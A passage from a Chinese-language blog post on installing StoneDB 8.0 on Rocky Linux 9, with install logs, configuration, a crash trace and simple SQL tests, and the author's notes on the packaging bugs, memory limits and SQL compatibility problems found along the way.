libluksmeta-9-12.el9.x86_64</span><br><span class="line">  luksmeta-9-12.el9.x86_64</span><br><span class="line">  oniguruma-6.9.6-1.el9.5.x86_64</span><br><span class="line">  python3-dasbus-1.4-5.el9.noarch</span><br><span class="line">  setroubleshoot-plugins-3.3.14-4.el9.noarch</span><br><span class="line">  setroubleshoot-server-3.3.32-1.el9.x86_64</span><br><span class="line">  snappy-1.1.8-8.el9.x86_64</span><br><span class="line">  snappy-devel-1.1.8-8.el9.x86_64</span><br><span class="line">  squashfs-tools-4.4-8.git1.el9.x86_64</span><br><span class="line">  tpm2-tools-5.2-3.el9.x86_64</span><br><span class="line">  udisks2-iscsi-2.9.4-9.el9.x86_64</span><br><span class="line">  udisks2-lvm2-2.9.4-9.el9.x86_64</span><br><span class="line"></span><br><span class="line">Complete!</span><br></pre></td></tr></table></figure></div>
<p>然后再次尝试安装。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@rocky9 stonedb]$ sudo yum install ./stonedb-ee-8.0-v2.2.0.el8.x86_64.rpm</span><br><span class="line">Last metadata expiration check: 1:32:37 ago on Tue 05 Dec 2023 01:02:18 PM UTC.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">================================================================================</span><br><span class="line"> Package            Architecture  Version             Repository           Size</span><br><span class="line">================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> stonedb_2.0        x86_64        2.2.0-1.el8         @commandline        434 M</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">================================================================================</span><br><span class="line">Install  1 Package</span><br><span class="line"></span><br><span class="line">Total size: 434 M</span><br><span class="line">Installed size: 1.1 G</span><br><span class="line">Is this ok [y/N]: y</span><br><span class="line">Downloading Packages:</span><br><span class="line">Running transaction check</span><br><span class="line">Transaction check succeeded.</span><br><span class="line">Running transaction test</span><br><span class="line">Transaction test succeeded.</span><br><span class="line">Running transaction</span><br><span class="line">  Preparing        :                                                        1/1</span><br><span class="line">  Running scriptlet: stonedb_2.0-2.2.0-1.el8.x86_64                         1/1</span><br><span class="line">  Installing       : stonedb_2.0-2.2.0-1.el8.x86_64                         1/1</span><br><span class="line">  Running scriptlet: stonedb_2.0-2.2.0-1.el8.x86_64                         1/1</span><br><span class="line">removed &#x27;/opt/stonedb_v2/install/bin/monetdb&#x27;</span><br><span class="line">removed &#x27;/opt/stonedb_v2/install/bin/monetdbd&#x27;</span><br><span class="line">removed &#x27;/opt/stonedb_v2/install/bin/mclient&#x27;</span><br><span class="line">removed &#x27;/opt/stonedb_v2/install/bin/mserver5&#x27;</span><br><span class="line">removed &#x27;/opt/stonedb_v2/install/bin/monetdb_mtest.sh&#x27;</span><br><span class="line">/var/tmp/rpm-tmp.AzSlx4: line 15: upx: command not found</span><br><span class="line"></span><br><span class="line">  Verifying        : stonedb_2.0-2.2.0-1.el8.x86_64                         1/1</span><br><span class="line"></span><br><span class="line">Installed:</span><br><span class="line">  stonedb_2.0-2.2.0-1.el8.x86_64</span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line">[shawnyan@rocky9 stonedb]$</span><br></pre></td></tr></table></figure></div>
<p>可以看到安装成功。</p>
<h3 id="Q2-移除-monetdb">Q2: 移除 monetdb</h3>
<p>从上面的安装日志中可以看到有这么一段：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">removed &#x27;/opt/stonedb_v2/install/bin/monetdb&#x27;</span><br><span class="line">removed &#x27;/opt/stonedb_v2/install/bin/monetdbd&#x27;</span><br><span class="line">removed &#x27;/opt/stonedb_v2/install/bin/mclient&#x27;</span><br><span class="line">removed &#x27;/opt/stonedb_v2/install/bin/mserver5&#x27;</span><br><span class="line">removed &#x27;/opt/stonedb_v2/install/bin/monetdb_mtest.sh&#x27;</span><br></pre></td></tr></table></figure></div>
<p>不太清楚为什么要删掉 monetdb 的相关命令，导致后面无法启动 monetdb，如果真的不想要可以在打包时就过滤掉。</p>
<h3 id="Q3-upx">Q3: upx</h3>
<p>从上面的安装日志中可以看到有这么一段：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">/var/tmp/rpm-tmp.AzSlx4: line 15: upx: command not found</span><br></pre></td></tr></table></figure></div>
<p>如果 StoneDB 需要使用 <code>upx</code> 来压缩文件，更加优雅的方式是在写 spec 的时候放到依赖里，这样安装 StoneDB 的同时安装 <code>upx</code>。</p>
<!--
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@rocky9 install]# yum info upx</span><br><span class="line">Last metadata expiration check: 0:07:21 ago on Tue 05 Dec 2023 11:59:29 PM CST.</span><br><span class="line">Available Packages</span><br><span class="line">Name         : upx</span><br><span class="line">Version      : 4.0.2</span><br><span class="line">Release      : 1.el9</span><br><span class="line">Architecture : x86_64</span><br><span class="line">Size         : 664 k</span><br><span class="line">Source       : upx-4.0.2-1.el9.src.rpm</span><br><span class="line">Repository   : epel-aliyun</span><br><span class="line">Summary      : Ultimate Packer for eXecutables</span><br><span class="line">URL          : https://github.com/upx/upx</span><br><span class="line">License      : GPLv2+ and Public Domain</span><br><span class="line">Description  : UPX is a free, portable, extendable, high-performance executable</span><br><span class="line">             : packer for several different executable formats. It achieves an</span><br><span class="line">             : excellent compression ratio and offers very fast decompression. Your</span><br><span class="line">             : executables suffer no memory overhead or other drawbacks.</span><br></pre></td></tr></table></figure></div>
<p>–&gt;</p>
<h3 id="环境变量">环境变量</h3>
<p>安装完成后，切换到 <code>mysql</code> 用户，配置 Libary/PATH 路径:</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">export LD_LIBRARY_PATH=/opt/stonedb_v2/install/lib:/usr/local/lib64:$LD_LIBRARY_PATH</span><br><span class="line">export PATH=/opt/stonedb_v2/install/bin:$PATH</span><br></pre></td></tr></table></figure></div>
<p>检查动态库依赖:</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[mysql@rocky9 ~]$ ldd /opt/stonedb_v2/install/bin/mysqld</span><br><span class="line">        linux-vdso.so.1 (0x00007ffe5b778000)</span><br><span class="line">        libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x00007f2099825000)</span><br><span class="line">        librt.so.1 =&gt; /lib64/librt.so.1 (0x00007f2099820000)</span><br><span class="line">        libssl.so.1.1 =&gt; /usr/local/lib64/libssl.so.1.1 (0x00007f209978c000)</span><br><span class="line">        libcrypto.so.1.1 =&gt; /usr/local/lib64/libcrypto.so.1.1 (0x00007f2099400000)</span><br><span class="line">        libprotobuf-lite.so.3.19.4 =&gt; /opt/stonedb_v2/install/bin/../lib/private/libprotobuf-lite.so.3.19.4 (0x00007f20996ef000)</span><br><span class="line">        libmonetdbe.so.26 =&gt; /opt/stonedb_v2/install/bin/../lib/private/libmonetdbe.so.26 (0x00007f20993db000)</span><br><span class="line">        libaio.so.1 =&gt; /lib64/libaio.so.1 (0x00007f20996e8000)</span><br><span class="line">        libdl.so.2 =&gt; /lib64/libdl.so.2 (0x00007f20993d6000)</span><br><span class="line">        libstdc++.so.6 =&gt; /lib64/libstdc++.so.6 (0x00007f2099000000)</span><br><span class="line">        libm.so.6 =&gt; /lib64/libm.so.6 (0x00007f20992fb000)</span><br><span class="line">        libgcc_s.so.1 =&gt; /lib64/libgcc_s.so.1 (0x00007f20992e0000)</span><br><span class="line">        libc.so.6 =&gt; /lib64/libc.so.6 (0x00007f2098c00000)</span><br><span class="line">        libmonetdbsql.so.13 =&gt; /opt/stonedb_v2/install/lib64/libmonetdbsql.so.13 (0x00007f2098800000)</span><br><span class="line">        libmonetdb5.so.33 =&gt; /opt/stonedb_v2/install/lib64/libmonetdb5.so.33 (0x00007f2098400000)</span><br><span class="line">        libmapi.so.26 =&gt; /opt/stonedb_v2/install/lib64/libmapi.so.26 (0x00007f20992c1000)</span><br><span class="line">        libbat.so.26 =&gt; /opt/stonedb_v2/install/lib64/libbat.so.26 (0x00007f2097a00000)</span><br><span class="line">        libstream.so.26 =&gt; /opt/stonedb_v2/install/lib64/libstream.so.26 (0x00007f209929a000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007f2099839000)</span><br><span class="line">        libbz2.so.1 =&gt; /lib64/libbz2.so.1 (0x00007f2099287000)</span><br><span class="line">        liblz4.so.1 =&gt; /lib64/liblz4.so.1 (0x00007f2099263000)</span><br><span class="line">        libsnappy.so.1 =&gt; /lib64/libsnappy.so.1 (0x00007f2097600000)</span><br><span class="line">[mysql@rocky9 ~]$</span><br></pre></td></tr></table></figure></div>
<p>可以看到二进制文件 <code>mysqld</code> 所有动态库依赖都能找到，其中一部分指向了 StoneDB 自带的库文件。</p>
<!--
[mysql@rocky9 bin]$ ldd mysqld
...
	libssl.so.1.1 => not found
	libcrypto.so.1.1 => not found
...

>>>> yum install compat-openssl11

[mysql@rocky9 bin]$ ldd mysqld
...
	libssl.so.1.1 => /lib64/libssl.so.1.1 (0x00007f82976cd000)
	libcrypto.so.1.1 => /lib64/libcrypto.so.1.1 (0x00007f8297200000)
...
-->
<h3 id="编辑配置文件-my-cnf">编辑配置文件 my.cnf</h3>
<p>编辑配置文件 <code>/etc/my.cnf</code>，增加如下内容：</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line">[<span class="string">client</span>]</span><br><span class="line"><span class="string">port</span>                <span class="string">=</span> <span class="number">3306</span></span><br><span class="line"><span class="string">socket</span>              <span class="string">=</span> <span class="string">/opt/stonedb_v2/install/data/mysql.sock</span></span><br><span class="line"></span><br><span class="line">[<span class="string">mysqld</span>]</span><br><span class="line"><span class="string">port</span>                <span class="string">=</span> <span class="number">3306</span></span><br><span class="line"><span class="string">server-id</span>           <span class="string">=</span> <span class="number">1</span></span><br><span class="line"><span class="string">basedir</span>             <span class="string">=</span> <span class="string">/opt/stonedb_v2/install/</span></span><br><span class="line"><span class="string">datadir</span>             <span class="string">=</span> <span class="string">/opt/stonedb_v2/install/data/</span></span><br><span class="line"><span class="string">pid-file</span>            <span class="string">=</span> <span class="string">/opt/stonedb_v2/install/data/mysqld.pid</span></span><br><span class="line"><span class="string">socket</span>              <span class="string">=</span> <span class="string">/opt/stonedb_v2/install/data/mysql.sock</span></span><br><span class="line"><span class="string">tmpdir</span>              <span class="string">=</span> <span class="string">/opt/stonedb_v2/install/tmp/</span></span><br><span class="line"><span class="string">log-error</span>           <span class="string">=</span> <span class="string">/opt/stonedb_v2/install/log/mysqld.log</span></span><br><span class="line"><span class="string">slow-query-log</span>      <span class="string">=</span> <span class="literal">TRUE</span></span><br><span class="line"><span class="string">slow-query-log-file</span> <span class="string">=</span> <span class="string">/opt/stonedb_v2/install/log/slow.log</span></span><br><span class="line"><span class="string">log-bin</span>             <span class="string">=</span> <span class="string">/opt/stonedb_v2/install/binlog/BINLOG</span></span><br></pre></td></tr></table></figure></div>
<p>主要将文件路径指向到安装目录。</p>
<h3 id="Q4-帮助信息">Q4: 帮助信息</h3>
<p>在查看帮助信息时，遇到了 <code>mysqld got signal 11</code> 报错，报错信息如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[mysql@rocky9 ~]$ mysqld --verbose --help</span><br><span class="line">mysqld  Ver 8.0.33 for Linux on x86_64 (Source distribution)</span><br><span class="line">BuildID[sha1]=150f81d4108e038e942961c325806ba3d1479f58</span><br><span class="line">Copyright (c) 2000, 2023, StoneAtom and/or its affiliates.</span><br><span class="line"></span><br><span class="line">StoneDB is a registered trademark of StoneAtom Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Starts the MySQL database server.</span><br><span class="line"></span><br><span class="line">Usage: mysqld [OPTIONS]</span><br><span class="line"></span><br><span class="line">Default options are read from the following files in the given order:</span><br><span class="line">/etc/my.cnf /etc/mysql/my.cnf /opt/stonedb_v2/install/etc/my.cnf ~/.my.cnf</span><br><span class="line">The following groups are read: mysql_cluster mysqld server mysqld-8.0</span><br><span class="line">The following options may be given as the first argument:</span><br><span class="line">...</span><br><span class="line">To see what values a running MySQL server is using, type</span><br><span class="line">&#x27;mysqladmin variables&#x27; instead of &#x27;mysqld --verbose --help&#x27;.</span><br><span class="line">2023-12-05T14:57:05Z UTC - mysqld got signal 11 ;</span><br><span class="line">Most likely, you have hit a bug, but this error can also be caused by malfunctioning hardware.</span><br><span class="line">BuildID[sha1]=150f81d4108e038e942961c325806ba3d1479f58</span><br><span class="line">Thread pointer: 0x0</span><br><span class="line">Attempting backtrace. You can use the following information to find out</span><br><span class="line">where mysqld died. If you see no messages after this, something went</span><br><span class="line">terribly wrong...</span><br><span class="line">stack_bottom = 0 thread_stack 0x100000</span><br><span class="line">/opt/stonedb_v2/install/bin/mysqld(my_print_stacktrace(unsigned char const*, unsigned long)+0x2e) [0x236c4fe]</span><br><span class="line">/opt/stonedb_v2/install/bin/mysqld(print_fatal_signal(int)+0x377) [0x1047637]</span><br><span class="line">/opt/stonedb_v2/install/bin/mysqld(handle_fatal_signal+0x95) [0x10476d5]</span><br><span class="line">/lib64/libc.so.6(+0x54db0) [0x7fecd2854db0]</span><br><span class="line">/opt/stonedb_v2/install/bin/mysqld(Mondetdb_Adaptor::Mondetdb_Adaptor()+0x407) [0x1004f37]</span><br><span class="line">/opt/stonedb_v2/install/bin/mysqld(Mondetdb_Adaptor::instance()+0x35) [0x10051c5]</span><br><span class="line">/opt/stonedb_v2/install/bin/mysqld() [0xd957a4]</span><br><span class="line">/opt/stonedb_v2/install/bin/mysqld() [0xd9c4f7]</span><br><span class="line">/opt/stonedb_v2/install/bin/mysqld() [0xda3f98]</span><br><span class="line">/opt/stonedb_v2/install/bin/mysqld(mysqld_main(int, char**)+0x2454) [0xdab194]</span><br><span class="line">/lib64/libc.so.6(+0x3feb0) [0x7fecd283feb0]</span><br><span class="line">/lib64/libc.so.6(__libc_start_main+0x80) [0x7fecd283ff60]</span><br><span class="line">/opt/stonedb_v2/install/bin/mysqld(_start+0x2e) [0xd8a46e]</span><br><span class="line">The manual page at http://dev.mysql.com/doc/mysql/en/crashing.html contains</span><br><span class="line">information that should help you find out what is causing the crash.</span><br><span class="line">[mysql@rocky9 ~]$</span><br></pre></td></tr></table></figure></div>
<h3 id="初始化-StoneDB">初始化 StoneDB</h3>
<p>使用如下命令进行初始化：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mysqld --initialize-insecure</span><br></pre></td></tr></table></figure></div>
<p>初始化成功后，日志显示如下。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[mysql@rocky9 log]$ cat mysqld.log</span><br><span class="line">2023-12-05T15:18:55.368727Z 0 [System] [MY-013169] [Server] /opt/stonedb_v2/install/bin/mysqld (mysqld 8.0.33) initializing of server in progress as process 402224</span><br><span class="line">2023-12-05T15:18:55.393904Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.</span><br><span class="line">2023-12-05T15:19:07.595251Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.</span><br><span class="line">2023-12-05T15:21:50.409230Z 6 [Warning] [MY-010453] [Server] root@localhost is created with an empty password ! Please consider switching off the --initialize-insecure option.</span><br><span class="line">[mysql@rocky9 log]$</span><br></pre></td></tr></table></figure></div>
<h3 id="Q5：推荐配置">Q5：推荐配置</h3>
<p>在文档 <a class="link"   href="https://www.stoneatom.com/StonedbDocs?id=186" >服务器推荐配置 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 中，建议开发、测试环境使用 2c+ 2g+ 配置，</p>
<p>可是，本文一开始使用的环境是 2c4g，初始化时只成功了一次，而且耗费较长时间，后面再试几次均未成功，而且尝试过程中，内存打满，swap被大量占用。</p>
<img  alt="stonedbswap.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231205-55759881-e34d-4201-8746-fa78cc354334.png"
                      referrerpolicy="no-referrer"
                >
<p>推荐配置已无法满足 StoneDB 8.0。</p>
<h3 id="运行-StoneDB">运行 StoneDB</h3>
<p>启动数据库</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mysqld_safe &amp;</span><br></pre></td></tr></table></figure></div>
<h3 id="Q6：-InnoDB-初始化">Q6： InnoDB 初始化</h3>
<p>每次启动数据库时，日志中都会打印 InnoDB 初始化，不知道这里是哪个环节打印的信息。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">2023-12-05T15:07:14.654886Z mysqld_safe Logging to &#x27;/opt/stonedb_v2/install/log/mysqld.log&#x27;.</span><br><span class="line">2023-12-05T15:07:14.882598Z mysqld_safe Starting mysqld daemon with databases from /opt/stonedb_v2/install/data</span><br><span class="line">2023-12-05T15:07:15.559446Z 0 [System] [MY-010116] [Server] /opt/stonedb_v2/install/bin/mysqld (mysqld 8.0.33) starting as process 48880</span><br><span class="line">2023-12-05T15:07:15.597722Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.</span><br><span class="line">2023-12-05T15:07:16.044637Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.</span><br><span class="line">2023-12-05T15:07:19.543799Z 0 [Warning] [MY-010068] [Server] CA certificate ca.pem is self signed.</span><br><span class="line">2023-12-05T15:07:19.543948Z 0 [System] [MY-013602] [Server] Channel mysql_main configured to support TLS. Encrypted connections are now supported for this channel.</span><br><span class="line">2023-12-05T15:07:19.647474Z 0 [System] [MY-011323] [Server] X Plugin ready for connections. Bind-address: &#x27;::&#x27; port: 33060, socket: /tmp/mysqlx.sock</span><br><span class="line">2023-12-05T15:07:19.649315Z 0 [System] [MY-010931] [Server] /opt/stonedb_v2/install/bin/mysqld: ready for connections. Version: &#x27;8.0.33&#x27;  socket: &#x27;/opt/stonedb_v2/install/data/mysql.sock&#x27;  port: 3306  Source distribution.</span><br></pre></td></tr></table></figure></div>
<h2 id="简单-CRUD-测试">简单 CRUD 测试</h2>
<p>连接数据库，并进行常规 CRUD 测试。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[mysql@rocky9 log]$ mysql -uroot </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 8</span><br><span class="line">Server version: 8.0.33 Source distribution</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2023, StoneAtom and/or its affiliates.</span><br><span class="line"></span><br><span class="line">StoneDB is a registered trademark of StoneAtom Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">\s</span></span><br><span class="line">--------------</span><br><span class="line">mysql  Ver 8.0.33 for Linux on x86_64 (Source distribution)</span><br><span class="line"></span><br><span class="line">Connection id:		8</span><br><span class="line">Current database:	</span><br><span class="line">Current user:		root@localhost</span><br><span class="line">SSL:			Not in use</span><br><span class="line">Current pager:		stdout</span><br><span class="line">Using outfile:		&#x27;&#x27;</span><br><span class="line">Using delimiter:	;</span><br><span class="line">Server version:		8.0.33 Source distribution</span><br><span class="line">Protocol version:	10</span><br><span class="line">Connection:		Localhost via UNIX socket</span><br><span class="line">Server characterset:	utf8mb4</span><br><span class="line">Db     characterset:	utf8mb4</span><br><span class="line">Client characterset:	utf8mb4</span><br><span class="line">Conn.  characterset:	utf8mb4</span><br><span class="line">UNIX socket:		/opt/stonedb_v2/install/data/mysql.sock</span><br><span class="line">Binary data as:		Hexadecimal</span><br><span class="line">Uptime:			1 min 35 sec</span><br><span class="line"></span><br><span class="line">Threads: 2  Questions: 5  Slow queries: 0  Opens: 120  Flush tables: 3  Open tables: 36  Queries per second avg: 0.052</span><br><span class="line">--------------</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">create schema s1;</span></span><br><span class="line">Query OK, 1 row affected (0.02 sec)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">use s1;</span></span><br><span class="line">Database changed</span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">create table t1(<span class="built_in">id</span> int);</span></span><br><span class="line">Query OK, 0 rows affected (0.06 sec)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">insert t1 <span class="keyword">select</span> 1;</span></span><br><span class="line">ERROR 4164 (HY000): exec sql err: ParseException:SQLparser:42000!syntax error, unexpected IDENT, expecting INTO in: &quot;insert t1&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">insert into t1 <span class="keyword">select</span> 1;</span></span><br><span class="line">Query OK, 1 row affected (0.02 sec)</span><br><span class="line">Records: 1  Duplicates: 0  Warnings: 0</span><br></pre></td></tr></table></figure></div>
<p>这里遇到了语法解析异常，也印证 StoneDB 的语法解析部分已经和 MySQL 有所不同。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash"><span class="keyword">select</span> * from t1;</span></span><br><span class="line">+------+</span><br><span class="line">| id   |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">show create table t1\G</span></span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">       Table: t1</span><br><span class="line">Create Table: CREATE TABLE `t1` (</span><br><span class="line">  `id` int DEFAULT NULL</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">update t1 <span class="built_in">set</span> <span class="built_in">id</span> = 2 <span class="built_in">where</span> 1=1;</span></span><br><span class="line">ERROR 4164 (HY000): exec sql err: SQLException:sql.execute:25005!Current transaction is aborted (please ROLLBACK)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">update t1 <span class="built_in">set</span> <span class="built_in">id</span> = 2 <span class="built_in">where</span> <span class="built_in">id</span> = 1;</span></span><br><span class="line">Query OK, 1 row affected (0.02 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br></pre></td></tr></table></figure></div>
<p>这里再次遇到了 SQL 异常，更新语句条件带有 <code>1=1</code> 时，抛异常。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash"><span class="keyword">select</span> * into outfile <span class="string">&#x27;t2.sql&#x27;</span> from t2;</span></span><br><span class="line">ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure></div>
<p>尝试导出数据到文件时，提示需要开启 <code>--secure-file-priv</code> 选项，重启数据库。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[mysql@rocky9 log]$ mysqld --secure-file-priv=/tmp &amp;</span><br></pre></td></tr></table></figure></div>
<p>再次尝试导数。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/tmp/t2.sql&#x27;</span> <span class="keyword">from</span> t2;</span><br><span class="line">ERROR <span class="number">3136</span> (<span class="number">42000</span>): ParseException:SQLparser:<span class="number">42000</span><span class="operator">!</span>syntax error, unexpected STRING, expecting SCOLON <span class="keyword">in</span>: &quot;select * into outfile &#x27;/tmp/t2.sql&#x27;&quot;</span><br></pre></td></tr></table></figure></div>
<p>然鹅，依旧提示报错，提示语法错误，而且会生成空文件。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 ~]# ll /tmp/t2.sql </span><br><span class="line">-rw-r-----. 1 mysql mysql 0 Dec  5 23:24 /tmp/t2.sql</span><br></pre></td></tr></table></figure></div>
<p>尝试几次无果，也没找到相关文档说明，暂时先这样。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">SELECT <span class="built_in">id</span> INTO OUTFILE <span class="string">&#x27;/tmp/t2.txt&#x27;</span></span></span><br><span class="line">    -&gt;   FIELDS TERMINATED BY &#x27;,&#x27; OPTIONALLY ENCLOSED BY &#x27;&quot;&#x27;</span><br><span class="line">    -&gt;   LINES TERMINATED BY &#x27;\n&#x27;</span><br><span class="line">    -&gt;   FROM t2;</span><br><span class="line">ERROR 3136 (42000): ParseException:SQLparser:42000!syntax error, unexpected STRING, expecting SCOLON in: &quot;select id into outfile &#x27;/tmp/t2.txt&#x27;&quot;</span><br></pre></td></tr></table></figure></div>
<p>创建 <code>FUNCTION</code> ，第一次和第二次执行遇到的报错不同，去掉 <code>CONCAT</code> 之后，创建成功。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">CREATE FUNCTION hello (s CHAR(20))</span></span><br><span class="line">    -&gt; RETURNS CHAR(50) DETERMINISTIC</span><br><span class="line">    -&gt; RETURN CONCAT(&#x27;Hello, &#x27;,s,&#x27;!&#x27;);</span><br><span class="line">ERROR 4164 (HY000): exec sql err: SQLException:sql.execute:25005!Current transaction is aborted (please ROLLBACK)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">CREATE FUNCTION hello (s CHAR(20))</span></span><br><span class="line">    -&gt; RETURNS CHAR(50) </span><br><span class="line">    -&gt; RETURN CONCAT(&#x27;Hello, &#x27;,s,&#x27;!&#x27;);</span><br><span class="line">ERROR 1418 (HY000): This function has none of DETERMINISTIC, NO SQL, or READS SQL DATA in its declaration and binary logging is enabled (you *might* want to use the less safe log_bin_trust_function_creators variable)</span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">mysql&gt;</span> </span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">CREATE FUNCTION hello (s CHAR(20))</span></span><br><span class="line">    -&gt; RETURNS CHAR(50) DETERMINISTIC</span><br><span class="line">    -&gt; RETURN CONCAT(&#x27;Hello, &#x27;,s,&#x27;!&#x27;);</span><br><span class="line">ERROR 4164 (HY000): exec sql err: ParseException:SQLparser:42000!SELECT: no such operator &#x27;concat&#x27;(char(7), char(20), char(1))</span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">mysql&gt; CREATE FUNCTION hello (s CHAR(20)) RETURNS CHAR(50) DETERMINISTIC RETURN <span class="string">&#x27;Hello!&#x27;</span>;</span></span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">SELECT hello(<span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line">+-----------+</span><br><span class="line">| hello(&#x27;&#x27;) |</span><br><span class="line">+-----------+</span><br><span class="line">| Hello!    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="存储引擎">存储引擎</h2>
<p>StoneDB 5.7 中引入了自己的存储引擎 Tianmu。</p>
<blockquote>
<p>在创建表时，您可以显式指定表的存储引擎，如创建表指定 engine=innodb。如果 StoneDB 采用主从架构部署，在 StoneDB 备库配置了 sql_mode 强制 tianmu 引擎的变量：MANDATORY_TIANMU。那么在主库创建时即使指定了 engine=innodb 的表，备库表结构同步也会自动变为engine=Tianmu。数据从主节点同步至从节点的过程中，会自动完成行列组织格式的转换。在优先级上，sql_mode =‘MANDATORY_TIANMU’ &gt; default_storage_engine。<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p>
</blockquote>
<p>但是，在 StoneDB 8.0 中默认的存储引擎为 InnoDB。</p>
